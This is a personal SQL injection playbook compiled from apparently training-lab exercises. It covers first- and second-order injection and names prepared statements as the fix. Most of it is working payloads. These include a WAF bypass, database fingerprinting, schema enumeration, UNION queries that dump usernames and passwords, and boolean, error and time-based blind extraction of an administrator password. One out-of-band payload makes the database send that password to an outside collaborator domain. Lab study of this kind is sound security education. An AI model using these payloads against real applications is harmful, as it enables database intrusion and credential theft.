# My SQL Injection (SQLi) Playbook

This is my personal documentation for SQL injection. I built this from the labs I completed so I can read it again in the future and immediately understand my own methodology and payloads.

## Core Concepts
SQLi is basically changing the URL or parameters we push as a request and making the backend server act for what we put in it.

* **First Order SQLi:** Changing the code in the active request itself, like using a select inside a GET parameter or inside the body next to a variable in a POST request.
* **Second Order SQLi:** The first query gets saved into the database safely. After that, we use our next command to trigger it and change it into something vulnerable to use it for the next steps.
* **Basic Rules:** * The `'--` or `#` removes everything that comes after it in the query.
  * `' OR 1=1` just says true for everything, which lets us bypass things like login screens.
* **The Fix:** To remediate this, developers must use Prepared Statements (Parameterized Queries) so the backend treats our input strictly as data and never as code.

---

## WAF Bypass
* **Lab: SQL injection with filter bypass via XML encoding (PL-1)**
There is a WAF protecting the server from basic SQLi. Since the app takes XML, I used Hackvertor to convert the command to hex entities to make it undetectable by the WAF. The database automatically decodes it on the backend and runs it.
* **Payload:** `<@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>`

---

## Database Types and Versions
When examining the database, I need to find the type and version first so I know exactly what queries to use.

* **Microsoft, MySQL:** `SELECT @@version`
* **Oracle:** `SELECT * FROM v$version`
* **PostgreSQL:** `SELECT version()`

### Lab Examples:
* **Oracle (PL-2):** Found SQLi in the category filter GET request, so I used the Oracle banner query.
  `GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
* **MySQL and Microsoft (PL-3):** Found SQLi in category filter, used `@@version` with a `#` comment for MySQL.
  `GET /filter?category=Corporate+gifts'+UNION+SELECT+@@version,+NULL#`

---

## Mapping Database Contents (Enumeration)
If I do not know the table or column names, I have to extract them from the database schema.

### Non-Oracle Databases (PL-4)
1. **Find all tables:** Sent this query along with the normal request to find the custom user table name (found `users_lpxeav`).
   `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
2. **Find columns:** Extracted the column names from that specific table to find the username and password fields.
   `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_lpxeav'--`
3. **Extract credentials:** Pulled all the usernames and passwords directly from that table.
   `'+UNION+SELECT+username_dfqphv,+password_qojfbx+FROM+users_lpxeav--`

### Oracle Databases (PL-5)
The query logic is the same as PL-4, but the table syntax differs because Oracle uses `all_tables` and `all_tab_columns`.
1. **Find tables:** `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
2. **Find columns:** `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_OQDRQH'--`
3. **Extract credentials:** Once I found `USERNAME_HDXSLX` and `PASSWORD_EMVRSN`, I dumped them.
   `Gifts'+UNION+SELECT+USERNAME_HDXSLX,+PASSWORD_EMVRSN+FROM+USERS_OQDRQH--`

---

## UNION Attacks
Here we add a UNION operator behind the actual query to make the server display more contents, like asking for usernames and passwords after a normal query like getting products.

### Step 1: Find Column Count (PL-6)
My query must return the exact same number of columns as the original query. I keep on increasing `NULL` values or use `ORDER BY 1,2,3` until I see no error and the page pops up normally. That tells me exactly how many columns exist.
* **Payload:** `'+UNION+SELECT+NULL,NULL,NULL--` (Confirms 3 columns).
* **Oracle Note:** In Oracle, a table must always be specified, so I use the built-in table named `DUAL` to make the column count test work: `' UNION SELECT NULL,NULL FROM DUAL--`.

### Step 2: Find Columns Holding Text (PL-7)
Once I know the column count, I add random values into each column index one by one to see which column can display text without breaking.
* **Payload:** `'+UNION+SELECT+NULL,'oIjIRU',NULL--` (Confirms the second column holds text).

### Step 3: Pull Data (PL-8 & PL-9)
* **Multiple Columns (PL-8):** If there are multiple text columns, I pull the fields directly.
  `'+UNION+SELECT+username,password+FROM+users--`
* **Single Column Concatenation (PL-9):** If only one column holds text, I use the `||` operator to merge the username and password into a single column string, using a `~` separator so I can easily distinguish them.
  `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

---

## Blind SQLi Techniques
Blind SQLi means we do not directly put the query in the SQL and get the answer printed on the screen. Instead, we use boolean or operational queries to ask the database Yes/No questions to extract data character by character.

### A. Conditional Responses / Boolean (PL-10)
If I add `1=1` to the request and it runs normally, but adding `1=2` causes the page to behave differently (like a "Welcome Back" message disappearing), Blind SQLi exists. I use a substring function to check if the first letter of the password matches a specific character, then iterate through the alphabet.
* **Payload:** `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

### B. Conditional Errors (PL-11)
When the page looks exactly the same visually, I use queries that trigger a backend database error (like a divide-by-zero error `1/0`) only if my character guess is true. If the guess is true, the server returns a `500 Internal Server Error`. If the guess is false, it returns a normal `200 OK`. 
* **Payload:** `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

### C. Time Delays (PL-12 & PL-13)
When the page does not show any output differences, visual changes, or error changes, I use time-based queries. I inject a sleep command like `pg_sleep(10)`. If the guessed character is correct, the response delays by 10 seconds. If it is wrong, it returns a normal quick response.
* **Confirmation Payload:** `TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
* **Extraction Payload:** `TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`

### D. Out-of-Band (OAST) Exfiltration (PL-14)
When normal blind methods do not work because there is absolutely no response variance, error feedback, or time delay differences, I use out-of-band exfiltration. I use XML commands to force the database to send a DNS/HTTP request to an external server I control (Burp Collaborator), appending the administrator password right into the subdomain.
* **Payload:** `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABDOMAIN/"> %remote;]>'),'/l')+FROM+dual--`
* **Result:** The password digits show up directly in my inbound domain connection logs.
